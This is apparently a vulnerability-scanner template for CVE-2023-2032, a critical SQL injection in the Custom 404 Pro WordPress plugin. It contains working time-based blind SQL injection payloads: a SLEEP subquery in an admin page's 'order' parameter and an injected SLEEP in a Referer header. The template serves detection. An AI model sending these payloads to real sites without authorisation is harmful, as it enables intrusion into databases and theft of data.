id: CVE-2023-2032

info:
  name: Custom 404 Pro WordPress Plugin SQL Injection
  author: ProjectDiscoveryAI
  severity: critical
  description: The Custom 404 Pro WordPress plugin before 3.8.1 does not properly sanitize database inputs, leading to multiple SQL Injection vulnerabilities.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive data.
  remediation: |
    Update the Custom 404 Pro WordPress Plugin to the latest version to mitigate the SQL Injection vulnerability.
  reference:
    - https://wpscan.com/vulnerability/17acde5d-44ea-4e77-8670-260d22e28ffe
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-2032
    epss-score: 0.00126
    epss-percentile: 0.48785
    cpe: cpe:2.3:a:kunalnagar:custom_404_pro:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: kunalnagar
    product: custom_404_pro
    framework: wordpress
  tags: wpscan

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-admin/admin.php?page=c4p-main&order=%2C(SELECT(SLEEP(2)))&orderby=created"

    matchers:
      - type: dsl
        dsl:
          - "duration>=6"

  - method: GET
    path:
      - "{{BaseURL}}/fakepage"

    headers:
      Referer: "http://evil.com', (SELECT(SLEEP(10))))#"
    matchers:
      - type: dsl
        dsl:
          - "duration>=6"
